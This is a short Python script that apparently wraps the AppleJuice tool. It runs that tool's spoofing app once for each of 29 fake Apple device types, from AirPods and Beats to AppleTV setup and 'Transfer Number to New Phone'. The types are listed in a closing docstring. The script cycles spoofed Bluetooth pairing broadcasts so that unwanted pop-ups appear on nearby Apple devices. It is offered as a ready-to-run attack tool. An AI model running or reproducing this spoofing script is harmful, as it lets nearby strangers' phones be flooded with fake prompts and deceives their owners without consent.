#!/usr/bin/env python
# copy this script into the same directory as https://github.com/ECTO-1A/AppleJuice/
# more info: mobile.hacker.com

import os
import sys
import time
import subprocess as sp

def runApp(number):
    extProc = sp.Popen(['python3','app.py','-d',number])
    status = sp.Popen.poll(extProc) 
    time.sleep(6)
    sp.Popen.terminate(extProc) 

if __name__ == "__main__":
    #global configFile
    runApp("1")
    runApp("2")
    runApp("3")
    runApp("4")
    runApp("5")
    runApp("6")
    runApp("7")
    runApp("8")
    runApp("9")
    runApp("10")
    runApp("11")
    runApp("12")
    runApp("13")
    runApp("14")
    runApp("15")
    runApp("16")
    runApp("17")
    runApp("18")
    runApp("19")
    runApp("20")
    runApp("21")
    runApp("22")
    runApp("23")
    runApp("24")
    runApp("25")
    runApp("26")
    runApp("27")
    runApp("28")
    runApp("29")

"""
    1: "Airpods",
    2: "Airpods Pro",
    3: "Airpods Max",
    4: "Airpods Gen 2",
    5: "Airpods Gen 3",
    6: "Airpods Pro Gen 2",
    7: "PowerBeats",
    8: "PowerBeats Pro",
    9: "Beats Solo Pro",
    10: "Beats Studio Buds",
    11: "Beats Flex",
    12: "BeatsX",
    13: "Beats Solo3",
    14: "Beats Studio3",
    15: "Beats Studio Pro",
    16: "Beats Fit Pro",
    17: "Beats Studio Buds+",
    18: "AppleTV Setup",
    19: "AppleTV Pair",
    20: "AppleTV New User",
    21: "AppleTV AppleID Setup",
    22: "AppleTV Wireless Audio Sync",
    23: "AppleTV Homekit Setup",
    24: "AppleTV Keyboard",
    25: "AppleTV 'Connecting to Network'",
    26: "Homepod Setup",
    27: "Setup New Phone",
    28: "Transfer Number to New Phone",
    29: "TV Color Balance"
"""
